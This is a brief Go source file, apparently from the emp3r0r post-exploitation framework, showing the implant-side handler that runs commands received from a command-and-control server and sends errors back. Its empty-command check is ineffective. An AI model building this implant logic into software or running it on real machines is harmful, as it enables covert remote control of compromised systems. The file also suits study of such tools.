package handler

import (
	"log"
	"strings"

	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/c2transport"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
)

// exec cmd from C2 server
func HandleC2Command(cmdData *def.MsgTunData) {
	cmd_id := cmdData.CmdID
	cmd_argc := len(cmdData.CmdSlice)
	cmdSlice := append(cmdData.CmdSlice, []string{"--cmd_id", cmd_id}...)
	if cmd_argc < 0 {
		log.Printf("Invalid command: %v", cmdSlice)
	}
	log.Printf("Received command: %v", cmdSlice)
	command := CoreCommands()
	is_builtin := strings.HasPrefix(cmdSlice[0], "!")
	if is_builtin {
		command = C2Commands()
	}
	command.SetArgs(cmdSlice)
	command.SetOutput(log.Writer())
	err := command.Execute()
	if err != nil {
		c2transport.C2RespPrintf(command, "Error: %v", err)
	}
}
